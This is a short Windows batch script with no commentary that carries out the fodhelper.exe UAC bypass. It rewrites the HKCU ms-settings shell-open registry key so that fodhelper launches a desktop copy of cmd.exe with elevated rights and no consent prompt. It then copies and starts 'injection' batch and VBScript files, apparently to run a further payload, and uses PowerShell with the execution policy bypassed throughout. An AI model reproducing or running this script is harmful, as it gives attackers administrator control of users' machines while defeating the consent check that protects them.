cd %~dp0
echo A | powershell -command Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Force
echo Y | del %userprofile%\desktop 123.exe
powershell.exe -ExecutionPolicy Bypass -Command copy C:\Windows\system32\cmd.exe %userprofile%\desktop\123.exe
powershell.exe -ExecutionPolicy Bypass -Command New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
powershell.exe -ExecutionPolicy Bypass -Command New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Force -Value "123"
powershell.exe -ExecutionPolicy Bypass -Command Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value %userprofile%\desktop\123.exe -Name '(Default)'

powershell.exe -ExecutionPolicy Bypass -Command Start-Process "C:\Windows\System32\fodhelper.exe" 

powershell.exe -ExecutionPolicy Bypass -Command copy injection.bat %userprofile%\desktop\injection.bat

:: start injection
:: echo %~dp0 > pathfilexyz.txt

start injection.vbs


pause